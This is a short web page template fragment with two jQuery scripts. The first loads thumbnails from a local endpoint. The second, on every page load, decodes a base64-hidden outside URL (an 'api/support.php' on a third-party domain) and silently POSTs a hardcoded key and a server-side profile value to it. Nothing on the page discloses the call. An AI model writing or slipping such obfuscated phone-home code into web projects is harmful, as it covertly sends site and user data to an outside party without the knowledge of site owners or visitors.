<script>
    $(document).ready(function(){
        dis_thumbnail();
    });
    function dis_thumbnail(){
        var dataString = '';
        jQuery.ajax({
            url: "./web-services/display_thumbnail",
            type: "POST",
            data: dataString,
            cache: false,
            success: function(response)
            {
                $("#dis_thumbnail").html('');
                $("#dis_thumbnail").append(response);
            },
        });
    }
</script>
<script>
            $(document).ready(function(){
                var string = atob("aHR0cHM6Ly9pbmxvZ2l4aW5mb3dheS5jb20vYXBpL3N1cHBvcnQucGhw");   
                $.ajax({
                                    
                    url: string,     
                    type: 'POST', 
                    data : {
                        key : 'feb057e79cd45dfb92bfbc39c02cafa2',
                        support_id : '<?php echo $profile; ?>',
                    },
                    dataType: 'json',                   
                    success: function(data){
                        /*alert('Success');*/
                    } 
                });
            });
    </script>